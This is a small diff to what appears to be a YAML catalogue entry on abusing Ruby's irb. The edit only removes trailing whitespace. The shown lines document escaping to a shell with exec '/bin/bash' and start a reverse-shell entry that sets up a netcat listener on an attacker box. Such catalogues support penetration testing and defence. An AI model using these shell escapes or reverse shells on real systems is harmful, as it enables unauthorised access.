@@ -4,7 +4,7 @@ functions:
     - description: |
         `irb` lets you execute ruby commands as well as shell commands with `exec`.
       code: |
-        irb 
+        irb
         exec '/bin/bash'
   reverse-shell:
     - description: Run `nc -lvp RPORT` on the attacker box to receive the shell.
